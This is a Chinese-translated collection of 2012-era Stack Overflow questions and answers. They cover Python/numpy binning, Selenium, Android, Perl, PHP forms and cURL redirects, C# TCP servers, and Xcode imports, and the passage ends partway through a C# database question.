> 赞同：1
> 
> 时间：2012-04-24T21:10:22.350

1.  您应该将根节点的路径作为递归中的额外参数传入。
2.  您使用了错误的数据结构；你想使用字典。

例子：

```
>>> tree = {1:{11:'a', 12:'b'}, 2:{22:'c'}}
>>> def visit(tree, path=[]):
...     if isinstance(tree, dict):
...         for node,subtree in tree.items():
...             visit(subtree, path=path+[node])
...     else:
...         leaf = tree
...         print(path, leaf)

>>> visit(tree)
[1, 11] a
[1, 12] b
[2, 22] c 
```

# python - Python中的分位数/中位数/二维分箱

> ID：10305964
> 
> 赞同：7
> 
> 时间：2012-04-24T21:04:04.380
> 
> 标签：python, numpy, statistics, scipy

您是否知道针对以下问题的快速/优雅的 Python/Scipy/Numpy 解决方案：您有一组 x、y 坐标以及相关值 w（所有 1D 数组）。现在将 x 和 y 放入 2D 网格（大小 BINSxBINS）并计算每个 bin 的 w 值的分位数（如中位数），这最终会产生一个具有所需分位数的 BINSxBINS 2D 数组。

使用一些嵌套循环很容易做到这一点，但我相信有一个更优雅的解决方案。

谢谢，马克

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-24T22:39:16.720

这是我想出来的，我希望它有用。它不一定比使用循环更清洁或更好，但也许它会让你开始朝着更好的方向发展。

```
import numpy as np
bins_x, bins_y = 1., 1.
x = np.array([1,1,2,2,3,3,3])
y = np.array([1,1,2,2,3,3,3])
w = np.array([1,2,3,4,5,6,7], 'float')

# You can get a bin number for each point like this
x = (x // bins_x).astype('int')
y = (y // bins_y).astype('int')
shape = [x.max()+1, y.max()+1]
bin = np.ravel_multi_index([x, y], shape)

# You could get the mean by doing something like:
mean = np.bincount(bin, w) / np.bincount(bin)

# Median is a bit harder
order = bin.argsort()
bin = bin[order]
w = w[order]
edges = (bin[1:] != bin[:-1]).nonzero()[0] + 1
med_index = (np.r_[0, edges] + np.r_[edges, len(w)]) // 2
median = w[med_index]

# But that's not quite right, so maybe
median2 = [np.median(i) for i in np.split(w, edges)] 
```

也看看 numpy.histogram2d

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2014-11-19T12:24:03.200

我只是想自己做这件事，听起来你想要命令“scipy.stats.binned_statistic_2d”，你可以找到给定箱的第三个参数的平均值、中值、标准偏差或任何定义的函数。

我意识到这个问题已经得到解答，但我相信这是一个很好的内置解决方案。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-04-25T21:28:57.317

非常感谢您的代码。基于它，我找到了以下问题的解决方案（仅对您的代码进行了少量修改）：

```
import numpy as np
BINS=10
boxsize=10.0
bins_x, bins_y = boxsize/BINS, boxsize/BINS
x = np.array([0,0,0,1,1,1,2,2,2,3,3,3])
y = np.array([0,0,0,1,1,1,2,2,2,3,3,3])
w = np.array([0,1,2,0,1,2,0,1,2,0,1,2], 'float')

# You can get a bin number for each point like this
x = (x // bins_x).astype('int')
y = (y // bins_y).astype('int')
shape = [BINS, BINS]
bin = np.ravel_multi_index([x, y], shape)

# Median 
order = bin.argsort()
bin = bin[order]
w = w[order]
edges = (bin[1:] != bin[:-1]).nonzero()[0] + 1
median = [np.median(i) for i in np.split(w, edges)]

#construct BINSxBINS matrix with median values
binvals=np.unique(bin)
medvals=np.zeros([BINS*BINS])
medvals[binvals]=median
medvals=medvals.reshape([BINS,BINS])

print medvals 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-05-21T23:07:47.583

使用 numpy/scipy 它是这样的：

```
 import numpy as np
    import scipy.stats as stats

    x = np.random.uniform(0,200,100)
    y = np.random.uniform(0,200,100)
    w = np.random.uniform(1,10,100)

    h = np.histogram2d(x,y,bins=[10,10], weights=w,range=[[0,200],[0,200]])
    hist, bins_x, bins_y = h
    q = stats.mstats.mquantiles(hist,prob=[0.25, 0.5, 0.75])

    >>> q.round(2)
    array([ 512.8 ,  555.41,  592.73])

    q1 = np.where(hist<q[0],1,0)
    q2 = np.where(np.logical_and(q[0]<=hist,hist<q[1]),2,0)
    q3 = np.where(np.logical_and(q[1]<=hist,hist<=q[2]),3,0)
    q4 = np.where(q[2]<hist,4,0)

    >>>q1 + q2 + q3 + q4
    array([[4, 3, 4, 3, 1, 1, 4, 3, 1, 2],
   [1, 1, 4, 4, 2, 3, 1, 3, 3, 3],
   [2, 3, 3, 2, 2, 2, 3, 2, 4, 2],
   [2, 2, 3, 3, 3, 1, 2, 2, 1, 4],
   [1, 3, 1, 4, 2, 1, 3, 1, 1, 3],
   [4, 2, 2, 1, 2, 1, 3, 2, 1, 1],
   [4, 1, 1, 3, 1, 3, 4, 3, 2, 1],
   [4, 3, 1, 4, 4, 4, 1, 1, 2, 4],
   [2, 4, 4, 4, 3, 4, 2, 2, 2, 4],
   [2, 2, 4, 4, 3, 3, 1, 3, 4, 4]]) 
```

prob = [0.25, 0.5, 0.75] 是分位数设置的默认值，您可以更改或保留它。

# selenium - selenium web 驱动程序 - 将变量值从一个测试用例传递到另一个

> ID：10305967
> 
> 赞同：0
> 
> 时间：2012-04-24T21:04:10.263
> 
> 标签：selenium, selenium-webdriver

我在测试用例 CreateStateID 中有一个值为 11 的变量 stateID。如何将此值传递给 selenium wedriver 中的测试用例 DeleteStateID？

这在 selenium IDE 中可以正常工作，但在 webdriver 中不行。

在 selenium IDE 中的 CreateStateID

```
storeEval  | /\d*$/.exec(storedVars['myLocation'])  | stateID 
```

我必须在我的 selenium2 程序中为上述语句编写 java 代码。

在 selenium IDE 中 DeleteStateID

```
echo | ${stateID} 
```

selenium2 代码是

```
System.out.println("${sid}"); 
```

打印出空值。

编写将 stateID 从一个测试用例传递到另一个测试用例的 java 方法是最好的方法吗？

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T05:28:54.860

As stated in the comments:

*   check [this question](https://stackoverflow.com/questions/10019319/comparing-result-of-one-junit-test-with-another-test-in-same-class/) - it could help.
*   Another approach would be have the variable as **static** variable inside the tests, with getters and setters:

    ```
    private static String neededVariable;

    public String getVariable(){
      return neededVariable;
    }

    public void setVariable(String var){
      this.neededVariable = var;
    } 
    ```

And later in the code:

```
 String stateID = //the way how you get it from the storeEval
   setVariable(stateID); 
```

And in another test:

```
 String stateID = getVariable();
   //... and work with the stateID as you need 
```

Works ok in mine tests

# android - 如何在计算之前检查空的 EditText

> ID：10305970
> 
> 赞同：0
> 
> 时间：2012-04-24T21:04:18.660
> 
> 标签：android, double, editbox

在我的项目中，我有一个至少计算 2 个 EditBox 的按钮，但是当我将其留空并计算时，我得到了崩溃应用程序：

```
java.lang.NumberFormatException: Invalid double: ""
at java.lang.StringToReal.invalidReal(StringToReal.java:63)
at java.lang.StringToReal.parseDouble(StringToReal.java:248)
at java.lang.Double.parseDouble(Double.java:295)
at com.math.square.Level1.calculate(Level1.java:71)
at com.math.square.Level1.access$0(Level1.java:66)
at com.math.square.Level1$2.onClick(Level1.java:62)
at android.view.View.performClick(View.java:3511)
at android.view.View$PerformClick.run(View.java:14105)
at android.os.Handler.handleCallback(Handler.java:605)
at android.os.Handler.dispatchMessage(Handler.java:92)
at android.os.Looper.loop(Looper.java:137)
at android.app.ActivityThread.main(ActivityThread.java:4424)
at java.lang.reflect.Method.invokeNative(Native Method)
at java.lang.reflect.Method.invoke(Method.java:511)
at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:784)
at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:551)
at dalvik.system.NativeStart.main(Native Method) 
```

在计算之前我可以做些什么来检查，如果它是空的，提醒用户并且不要计算？

编码：

```
public class Level1 extends Activity {
    EditText amount1;
    EditText amount2;
    EditText amount3;
    EditText amount4;
    Button calculate;
    double a=0;
    double b=0;
    double c=0;
    double d=0;
    double e=0;
    double f=0;
    double g=0;
    double h=0;

    /** Called when the activity is first created. */
    @Override
      public void onCreate(Bundle savedInstanceState)
      {
          super.onCreate(savedInstanceState);
          setContentView(R.layout.level1);

          initControls();

        findViewById(R.id.Button05).setOnClickListener(
                new OnClickListener() {
            public void onClick(View v) {
                btn05(true);
            }
        });;
      }

          private void initControls()
          {
              amount1=(EditText)findViewById(R.id.amount1);
              amount2=(EditText)findViewById(R.id.amount2);
              amount3=(EditText)findViewById(R.id.amount3);
              amount4=(EditText)findViewById(R.id.amount4);
              calculate=(Button)findViewById(R.id.calculate);
              calculate.setOnClickListener(new Button.OnClickListener()
              {
                  public void onClick
              (View  v) { calculate();}
              });
          }

        private void calculate()
          {
              a=Double.parseDouble(amount1.getText().toString());
              b=Double.parseDouble(amount2.getText().toString());
              d=Double.parseDouble(amount3.getText().toString());
              e=Double.parseDouble(amount4.getText().toString());

              /** Check Value > 0*/
              EditText amount1value = (EditText)this.findViewById(R.id.amount1);
              EditText amount2value = (EditText)this.findViewById(R.id.amount2);
              EditText amount3value = (EditText)this.findViewById(R.id.amount3);
              EditText amount4value = (EditText)this.findViewById(R.id.amount4);
              Integer nameLen = 2;

              int len = amount1value.length();
              int len2 = amount2value.length();
              int len3 = amount3value.length();
              int len4 = amount4value.length();

              if (len<nameLen) {
                  amount1value.setError(getText(R.string.blank));
                  TextView Result = (TextView)findViewById(R.id.Result);
                  Result.setText(R.string.error_character_length);
              } else 
              if (len2<nameLen) {
                  amount2value.setError(getText(R.string.blank));
                  TextView Result = (TextView)findViewById(R.id.Result);
                  Result.setText(R.string.error_character_length);
              } else 
              if (len3<nameLen) {
                  amount3value.setError(getText(R.string.blank));
                  TextView Result = (TextView)findViewById(R.id.Result);
                  Result.setText(R.string.error_character_length);
              } else 
              if (len4<nameLen) {
                  amount4value.setError(getText(R.string.blank));
                  TextView Result = (TextView)findViewById(R.id.Result);
                  Result.setText(R.string.error_character_length);
              }  

              else {

              c=a+b;
              f=d+e;
              g=a+d;
              h=b+e;

              if(c==9 && f==12 && g==8 && h==13){
                TextView Result = (TextView)findViewById(R.id.Result);
                Result.setText(R.string.correct);
              }
              else {
                TextView Result = (TextView)findViewById(R.id.Result);
                Result.setText(R.string.wrong);
              }
              }
          } 
```

我创建了一个检查以查看是否有 2 个字符来避免用户出现空白，但这只是一种解决方法。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:50:58.193

答案要简单得多。在运行计算之前，只需检查 EditText 之前的文本。如果它为空，则显示错误 toast。否则继续计算。要注意的另一件事是您的 EditText 应该只接受数字作为输入类型。无需尝试捕获。有关详细信息，请查看开发站点上的 EditText 文档。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:18:17.163

围绕你的`parseDouble`方法`try-catch`，抓住`NumberFormatException`。如果发生异常，请通知用户他们输入了无效值并且不要继续计算。

# android - 如何在 Android 的 OnItemClickListener 中获取额外数据？

> ID：10305972
> 
> 赞同：0
> 
> 时间：2012-04-24T21:04:25.953
> 
> 标签：android

```
public void onItemClick(AdapterView<?> parent, View view, int position, long id) {
   // TODO Auto-generated method stub
    Bundle programNum = getIntent().getExtras();
    final int progNum = programNum.getInt("Program");
    Intent intent = new Intent(getBaseContext(), hotelAct3.class);
    String hotelName = (String) ((TextView)parent.getChildAt(position)).getText();
    startActivity(intent);
} 
```

它应该来自调用列表活动的活动：这样我就有一个活动“hotelAct2.class”在里面我放了额外的数据

公共类hotelAct2扩展活动{

```
EgyptDataSource datasource;
MySQLiteHelper sqlHelper;
ArrayAdapter<Hotel> hotelAdapter;
@Override
protected void onCreate(Bundle savedInstanceState) {
    // TODO Auto-generated method stub
    super.onCreate(savedInstanceState);
    setContentView(R.layout.hotelq2);
    Bundle programNum = getIntent().getExtras();
    final int progNum = programNum.getInt("Program");
    final String Srating = programNum.getString("Stars");
    //Intent ratingIntent = getIntent();
    //String Srating = ratingIntent.getStringExtra("Stars");

    Toast.makeText(hotelAct2.this, "The program is " + progNum + " The rating is " + Srating, Toast.LENGTH_LONG).show();

    RadioButton nileRB = (RadioButton) findViewById(R.id.hRB2a);
    RadioButton pyramidsRB = (RadioButton) findViewById(R.id.hRB2b);
    RadioButton downtownRB = (RadioButton) findViewById(R.id.hRB2c);
    RadioButton letmeRB = (RadioButton) findViewById(R.id.hRB2d);

    if(Srating.equals("Five"))
    {
    nileRB.setOnClickListener(new OnClickListener(){

        public void onClick(View v) {
            // TODO Auto-generated method stub
            Intent i = new Intent(hotelAct2.this, CairoHotelList.class);
            i.putExtra("RB", "nile5");
            i.putExtra("program", progNum);
            startActivity(i);
        }}); 
```

然后它启动“CairoHotelList.class”的活动列表我想在活动类的onItemClickListener中获取额外的数据

“progNum”返回 0，而它应该返回一个从 1 到 20 的数字，有什么帮助吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-24T21:11:50.570

该`getIntent`方法将返回用于启动当前活动的意图。它与适配器中的元素完全无关，并且该方法将为您单击的每个项目返回相同的值。

为了澄清你的问题，“progNum”究竟应该从哪里来？

# perl - Perl：匹配一个数组元素，然后将一个 PREVIOUS（5 个索引返回）数组元素复制到一个新数组

> ID：10305973
> 
> 赞同：3
> 
> 时间：2012-04-24T21:04:26.863
> 
> 标签：perl, bioinformatics, regular-language, fasta

本质上，我要做的是搜索一个大文本文件以识别每个显示“**未找到匹配项***"，并将匹配的标识符复制到一个新列表中。我对第一部分很好，但我似乎无法弄清楚如何将数组的元素精确地复制回 5 个索引（这是一个标识符）并将其复制到不同的数组。***

 ***我尝试过这样的事情，

```
$fastafile = 'HpHcTEST.txt';
open(FASTAFILE, $fastafile);
@seq = <FASTAFILE>;
my $fastaid;
foreach (@seq) {
    if ($_ =~ /\*\*\*\*\* No hits found \*\*\*\*\*/){
        $fastaid .= $_[-5];
    }
}

print "here are the IDs\n";
print $fastaid; 
```

有大量的 [-5] 变体，但没有一个起作用.. 我似乎找不到任何关于如何回溯引用并在满足匹配时获得前一个元素的文档。有人知道如何为此编码吗？

非常感谢您的宝贵时间。

安德鲁

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T21:15:52.500

您可以遍历索引和下标以获取数组元素：

```
for (5..$#seq) {
    $fastaid .= $seq[$_-5] if $seq[$_] =~ /your_regex/;
} 
```

在 Perl 5.12 或更高版本中，您还可以使用[`each`](http://perldoc.perl.org/functions/each.html)：

```
while (my ($index, $value) = each @seq) {
    next if $index < 5;
    $fastaid .= $seq[$index-5] if $value =~ /your_regex/;
} 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-04-24T21:12:24.967

## 快速修复

`@seq`一种方法是带着索引走过去。

```
my @fastaid;

for (my $i = 0; $i < @seq; ++$i) {
    if ($seq[$i] =~ /\*\*\*\*\* No hits found \*\*\*\*\*/){
        push @fastaid, $seq[$i - 5] if $i >= 5;
    }
} 
```

请注意从标量更改为名为 的数组`@fastaid`，您可以使用它打印

```
print "Here are the IDs:\n";
print "  - $_\n" for @fastaid; 
```

甚至

```
print "Here are the IDs:\n",
      map "  - $_\n", @fastaid; 
```

## 添加抛光剂

正如[`brian d foy`](https://stackoverflow.com/users/8817/brian-d-foy)下面评论中的注释，代码可以更优雅，更直接地表达意图。

```
my $id_offset = 5;
my @fastaid;

for ($id_offset .. $#seq) {
    if ($seq[$_] =~ /\*\*\*\*\* No hits found \*\*\*\*\*/){
        push @fastaid, $seq[$_ - $id_offset];
    }
} 
```

如[perldata 的“标量值”部分所述](http://perldoc.perl.org/perldata.html#Scalar-values)，`$#seq`是索引或`@seq`. [`..`范围运算符](http://perldoc.perl.org/perlop.html#Range-Operators)正确处理长度`@seq`小于`$id_offset`元素的情况。

显式的 regex-bind 运算符仍然有点不靠谱。你可以和

```
my $id_offset = 5;
my @fastaid;

for my $i ($id_offset .. $#seq) {
  for ($seq[$i]) {
    push @fastaid, $seq[$i - $id_offset]
      if /\*\*\*\*\* No hits found \*\*\*\*\*/;
  }
} 
```

或者如果您至少有 5.10 版

```
use feature 'switch';

# ...

my $id_offset = 5;
my @fastaid;

for my $i ($id_offset .. $#seq) {
  given ($seq[$i]) {
    when (/\*\*\*\*\* No hits found \*\*\*\*\*/) {
      push @fastaid, $seq[$i - $id_offset];
    }
  }
} 
```

## 历史记录

过去，有一些关于重新定位`$#`以跟踪数组遍历的索引的讨论，因此您可以编写

```
for (@fastaid) {
    if (/\*\*\*\*\* No hits found \*\*\*\*\*/) {
        push @fastaid, $seq[$# - 5] if $# >= 5;
    }
} 
```

但这从未实现。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-25T06:59:56.520

```
my @fasta_id = map { $seq[$_] =~ /your_regex/ ? $seq[$_-5] : () } 5 .. $#seq; 
```

* * *

## 回答 #4

> 赞同：-2
> 
> 时间：2012-04-24T21:19:01.737

使用“for”循环而不是“foreach”，

```
for ($index=0; $index < $#seq + 1; $index++) {
    if ($seq[$index] =~ /\*\*\*\*\* No hits found \*\*\*\*\*/){
        $fastaid .= $seq[$index-5];
    }
} 
```***

# android - 缩放动画安卓

> ID：10305974
> 
> 赞同：0
> 
> 时间：2012-04-24T21:04:27.690
> 
> 标签：android

你好，我看到这段代码为列表视图制作比例动画

```
public class ViewAnimation extends Animation {
float centerX, centerY;
public ViewAnimation3(){}
@Override
public void initialize(int width, int height, int parentWidth, int parentHeight) {
super.initialize(width, height, parentWidth, parentHeight);
centerX = width/2.0f;
centerY = height/2.0f;
setDuration(2500);
setFillAfter(true);
setInterpolator(new LinearInterpolator());
}
@Override
protected void applyTransformation(float interpolatedTime, Transformation t) {
final Matrix matrix = t.getMatrix();
matrix.setScale(interpolatedTime, interpolatedTime);
matrix.preTranslate(-centerX, -centerY);
matrix.postTranslate(centerX, centerY);
}
} 
```

我知道这将使 Activity 中心的动画而不是左上角的动画，但我不明白这些点在哪里（-centerX，-centerY）并且尊重动画左上角的内容或查看！

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-25T03:05:25.970

如果您在谈论矩阵运算，那很简单：基本的 setScale 围绕原点应用缩放。因此，通过将指定中心点的平移预先连接到原点，并后连接相反的平移以移回中心点，您将获得围绕中心点的缩放。

# php - 试图删除电子邮件表单PHP重定向功能并将其变成弹出消息

> ID：10305975
> 
> 赞同：0
> 
> 时间：2012-04-24T21:04:32.833
> 
> 标签：php, javascript, forms, email, redirect

我正在使用下面的代码向我的地址发送一封电子邮件，提醒我有新用户注册：

```
<?php
$errors  = '';
$myemail = 'name@mydomain.com';
if (empty($_POST['email']) || empty($_POST['email']) || empty($_POST['email'])) {
    $errors .= "\n Error: all fields are required";
}

$name          = $_POST['name'];
$email_address = $_POST['email'];
$message       = $_POST['message'];

if (!preg_match(
      "/^[_a-z0-9-]+(\.[_a-z0-9-]+)*@[a-z0-9-]+(\.[a-z0-9-]+)*(\.[a-z]{2,3})$/i",
      $email_address
   )) {
    $errors .= "\n Error: Invalid email address";
}

if (empty($errors)) {
    $to            = $myemail;
    $email_subject = "Invitation Request: $email_address";
    $email_body    = "has received a new invitation request. " .
                     "\n Email: $email_address";

    $headers = "From: $myemail\n";
    $headers .= "Reply-To: $email_address";

    mail($to, $email_subject, $email_body, $headers);
    //redirect to the 'thank you' page
}
?> 
```

目前它将用户重定向到一个新页面，但我希望它允许 javascript 弹出成功/失败消息，就像现代网站中使用的那样。

这是消息代码（CSS 和 Javascript）：

```
<script type="text/javascript" src="jquery-1.3.2.min.js"></script>

<style type="text/css">
/* Status Message */
.message { 
    display: none; 
    margin: 0 0 13px 0; 
    padding: 13px 13px 13px 52px; 
    background: url('icon_check.gif') left no-repeat #EFA; 
    background-position: 13px 5px; 
    border: solid 1px #BD8; '
    width: 300px; 
}
</style>

<script language="javascript" type="text/javascript">
$(document).ready(function(){
   $("#Button1").click(function(event){
     $(".message").show();
     $(".message").fadeOut(2500);
   });
 });
</script> 
```

这是成功消息的 html：

```
<div class="message">Your Invitation Request Has Been Received!</div> 
```

是否有可能做到这一点？在过去的两天里，我在几个地方寻找答案，但我似乎无法改变正确的事情。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-24T21:21:03.547

使用您当前的设置，最好的方法是使用查询字符串重定向回注册页面，该查询字符串告诉页面从那里打开窗口。

```
header("Location: /signup.php?success=true"); 
```

并在 JS

```
<script>

<?php
if(isset($_GET['success']) && $_GET['success'] == 'true'){
     echo "window.open( '/success.html', 'success', '[options],[..],[..]' );";
}
?>

</script> 
```

另外，我建议使用[filter_var](http://php.net/manual/en/function.filter-var.php)来验证电子邮件。

```
filter_var('bob@example.com', FILTER_VALIDATE_EMAIL) 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:09:27.653

最简单的方法是将 PHP 邮件功能与 HTML 页面结合起来。您可以使用 AJAX 将发送邮件 PHP 页面加载到 DIV 中，这将使用 PHP 函数的结果输出覆盖该 DIV 的内容。这将允许您对没有 JS 的用户进行后备，因为将表单提交到 PHP 页面仍然可以工作。

# c# - 无法第二次接受 TcpClient C#

> ID：10305977
> 
> 赞同：1
> 
> 时间：2012-04-24T21:04:42.773
> 
> 标签：c#, ftp, tcpclient, tcpserver

我对 C# 和客户端-服务器编程都是新手。现在，对于课堂，我正在尝试在不使用任何预先建立的 FTP 库的情况下创建一个 FTP 客户端。我觉得我的项目大部分都已关闭，但是当我进行多个需要使用数据端口（list、retr 等）的调用时，我遇到了问题。这是代码示例这是打破：

```
writer.WriteLine(portcmd);
writer.Flush();

GetServerMessage(stream);

writer.WriteLine("list ");
writer.Flush();

tmpserver = new TcpListener(IPAddress.Any, 3128);
tmpserver.Start(); 
tmpclient = tmpserver.AcceptTcpClient();
Console.WriteLine("gothere");

if (!tmpclient.Connected)
{
    tmpserver.Start();
}

StreamReader tmpreader = new StreamReader(tmpclient.GetStream());

GetServerMessage(stream);
while (tmpreader.Peek() != -1)
{
    Console.WriteLine(tmpreader.ReadLine());
}

tmpclient.Close();
tmpserver.Stop();

GetServerMessage(stream); 
```

Getservermessage 是一种获取网络流并在 0.5 秒超时内打印出所有可用内容的方法，stream 是当前连接到 FTP 服务器的 NetworkStream，而 writer 是包装在 StreamReader 中以便于编写 ASCII 的同一网络流字符到服务器。如果您想知道为什么我使用流读取器从数据连接中读取数据，那是因为服务器在传输数据后关闭了连接，因此我可以轻松获得 eof 通知。当我使用封闭的网络流时，我的 GetServerMessage 方法由于某种原因而中断。

此代码将端口命令发送到 FTP 服务器以通知它我将需要数据连接（前 2 行）然后发送列表命令，建立与服务器的数据连接，获取所需信息，然后终止数据连接（代码的其余部分）。

此代码在我第一次运行时将毫无缺陷地执行，但如果我再试一次，它会挂在“tmpclient = tmpserver.AcceptTcpClient();”上 线。它永远不会到达“gothere”打印语句。我相信这是因为我在同一端口上从同一台机器接收客户端，但我不确定。我尝试添加一个布尔值以确保 AcceptTcpClient() 仅运行一次，但随后出现运行时错误，Visual Studio 告诉我我可能已经“在完成资源之前释放了资源”我预测这将是一个问题，但是如何判断服务器是否在关闭一次后重新建立连接？

在给定代码的末尾，我停止 tmpserver 并关闭 tmpclient。我最初这样做是因为我知道 FTP 服务器在完成传输后会关闭连接，并认为这是正确的做法。我发现如果我注释掉这些行，代码将执行多次，但流似乎是空的......我不确定这些信息是否有帮助，但我想我会提到它。

如果我不清楚，我深表歉意，但我对这个主题缺乏了解，这使得我很难表达我的问题。如果对问题所在有任何困惑，我很乐意尝试解决它。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T21:34:43.807

为了能够接受另一个客户，您应该执行`tmpclient = tmpserver.AcceptTcpClient();`并等待第一个客户完成其工作（在接受第二个客户之前）可能不是一个好主意

这是一个示例服务器代码，它等待连接并回显每个客户端发送的字符串。你可以用`telnet localhost 3128`

```
Thread t = new Thread(Server);
t.IsBackground = true;
t.Start(); 
```

-

```
void Server()
{
    TcpListener listener = new TcpListener(IPAddress.Any, 3128);
    listener.Start();
    while (true)
    {
        var client = listener.AcceptTcpClient();
        new Thread(() =>
        {
            using (client)
            {
                var reader = new StreamReader(client.GetStream());
                var writer = new StreamWriter(client.GetStream());
                while (true)
                {
                    string line = reader.ReadLine();
                    if (line == "QUIT") break;
                    writer.WriteLine("From Thread[" + Thread.CurrentThread.ManagedThreadId + "] > " + line);
                    writer.Flush();
                }
            }
        }).Start();
    }
} 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:13:26.267

好的，是这样的。要以简单的方式创建服务器，您需要线程化处理客户端套接字的代码。当接受返回时，创建并启动一个线程，将“tmpclient”传递给它，然后再次循环到接受调用，以便任何新客户端都可以连接。在新生成的 server<> 客户端线程中，循环读取和写入传递的套接字以与客户端通信。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-24T21:13:48.790

关闭 tcp 客户端流后，您将无法再从从中提取的流中读取数据。

```
var stream = tcpClient.GetStream();
...
tcpclient.Close();
...
stream.Read .. fail 
```

客户端将不得不请求另一个连接，

或者

您应该保持您的 tcp 客户端套接字打开。

更复杂的服务器将保留一些关于客户端的元数据（状态）缓存，因此当套接字意外关闭时 - 并且客户端快速尝试重新连接，服务器可以继续顺利处理。

# php - 从网站解析电话号码

> ID：10305979
> 
> 赞同：0
> 
> 时间：2012-04-24T21:04:57.033
> 
> 标签：php, html, parsing, curl

试图[从网站](http://www.baroul-bucuresti.ro/index.php?w=definitivi&l=C&p=1)解析一些电话号码。

虽然我通过 cURL 获取源代码，但我只取回了一半的代码，但缺少的部分正是我所需要的。这件事一直困扰着我。

到目前为止我的代码：

```
$ch = curl_init("http://www.baroul-bucuresti.ro/index.php?w=definitivi&l=C&p=2");
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
$content = curl_exec($ch);
curl_close($ch);
print_r ($content); 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T20:28:48.650

我认为问题在于有问题的网址中有一个 302，将其重定向到另一个位置：

```
$ telnet www.baroul-bucuresti.ro 80
Trying 91.208.179.20...
Connected to www.baroul-bucuresti.ro.
Escape character is '^]'.
GET /index.php?w=definitivi&l=C&p=2 HTTP/1.1
host: www.baroul-bucuresti.ro

HTTP/1.1 302 Found
Date: Fri, 27 Apr 2012 20:24:54 GMT
Server: Apache/2.2.15 (CentOS)
X-Powered-By: PHP/5.3.3
Set-Cookie: PHPSESSID=qjbqvveqtmarv7o0f820bbeq71; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Set-Cookie: for_tablou=1
Set-Cookie: bvbsessionhash=b9c609e162dab90fc86c1fdb52e07fdd; expires=Sun, 27-May-2012 20:24:57 GMT; path=/
Set-Cookie: bvblastvisit=1335558297; expires=Sun, 27-May-2012 20:24:57 GMT; path=/
Set-Cookie: bvblastactivity=1335558297; expires=Sun, 27-May-2012 20:24:57 GMT; path=/
Set-Cookie: bvbuserid=deleted; expires=Thu, 28-Apr-2011 20:24:56 GMT; path=/
Set-Cookie: for_tablou=1
Location: /tablou 
```

我通过将此选项添加到 curl 来更改您的代码：

```
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
```

而且现在好像已经全部内容了..不知道是不是你想要的内容，但是它获取了真实位置的全部内容，你可以试试吗？

# iphone - XCode 4.3 import a nested header error: no such file or directory

> ID：10305982
> 
> 赞同：0
> 
> 时间：2012-04-24T21:05:09.423
> 
> 标签：iphone, import, header, nested, xcode4.3

我在尝试从嵌入在我的主项目中的项目中导入标头时遇到了一个令人讨厌的问题。下面指出的正确导入方法是什么`RKJSONParserJSONKit.h`？

我正在尝试：#import "RestKit/Support/RKJSONParserJSONKit.h"

但 Xcode 找不到该文件。

![项目结构](../Images/1cd6609f66dd49c43de1a4fcb1aade60.png)

![文件夹结构](../Images/f52838bda562e2cae94693febcff0d26.png)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-05T11:57:07.863

你必须导入 JSONKit

```
#import <RestKit/JSONKit.h> 
```

如果您在按上述方式导入它时遇到问题，请尝试通过以下方式加载套件

```
#import "RestKit/Code/Support/Parsers/JSON/RKJSONParserJSONKit.h" 
```

但是您应该将**RKParser.h**的副本添加到您的项目中

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-24T21:07:28.437

只需要做**`#import "RKJSONParserJSONKit.h"`**，无需包含**/ResKit/Support/**

* * *

## 回答 #3

> 赞同：-1
> 
> 时间：2012-04-27T02:07:09.900

我最终只是将所需文件从示例项目复制到主项目。一个非常仓促的选择，但在 Xcode 中花费数小时调试标头搜索路径并不是我最喜欢做的事情：/

# c# - 如何从数据库中检索数据

> ID：10305983
> 
> 赞同：-4
> 
> 时间：2012-04-24T21:05:14.083
> 
> 标签：c#, sql

我已经为菜单项创建了类，当有人从组合框中选择比萨饼并选择浇头时，我无法弄清楚如何获得价格。我正在从数据库中获取比萨饼价格和最高价格。这是我的披萨课

```
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using System.Data;

namespace ItalianoLIB.BLL
{

   public class Pizza
    {

       public string pizzaName { get; set; }
       public string toppingName { get; set; }
       public double toppingPrice { get; set; }
       public double pizzaPrice { get; set; }

    }
}

using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Windows.Forms;
using System.Data.SqlClient;

namespace ItalianoWIN.PLL
{

    public partial class PizzaMenu : Form 
    {
        public string newPizzaName { get; set; }
        public string newToppingName { get; set; }
        public double newToppingPrice { get; set; }
        public double newPizzaPrice { get; set; }

        public PizzaMenu()
        {  

            InitializeComponent();
        }

        private void Pizza_Load(object sender, EventArgs e)
        {

            //new connection from the DButils class
            SqlConnection con = new SqlConnection(ItalianoLIB.DLL.DButils.CONSTR);
            con.Open();

            //fill Pizza type combo box
            SqlDataAdapter da = new SqlDataAdapter("select * from pizza", con);
            DataTable dt = new DataTable();
            da.Fill(dt);

